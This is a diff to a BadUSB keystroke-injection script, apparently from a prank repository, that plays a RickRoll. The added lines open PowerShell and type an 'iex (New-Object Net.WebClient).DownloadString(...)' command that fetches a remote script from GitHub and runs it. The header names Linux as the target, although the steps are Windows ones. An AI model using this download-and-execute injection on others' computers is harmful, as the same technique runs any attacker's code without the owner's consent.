@@ -4,9 +4,12 @@ REM Description: RickRoll in Linux Command Prompt
 REM Target:	Linux
 GUI R
 DELAY 1000
-STRING iex (New-Object Net.WebClient).DownloadString("https://github.com/IadRabbit/BadUSB_Scripts/jokes/rick_roll_cmd_w_mp3/rick_roll_cmd_script.ps1")
+STRING PowerShell
+DELAY 750
+ENTER
 DELAY 1000
-STRING 
+STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/IadRabbit/BadUSB_Scripts/main/jokes/rick_roll_cmd_w_mp3/rick_roll_cmd_script.ps1")
+DELAY 1000
 ENTER
 DELAY 750
 F11
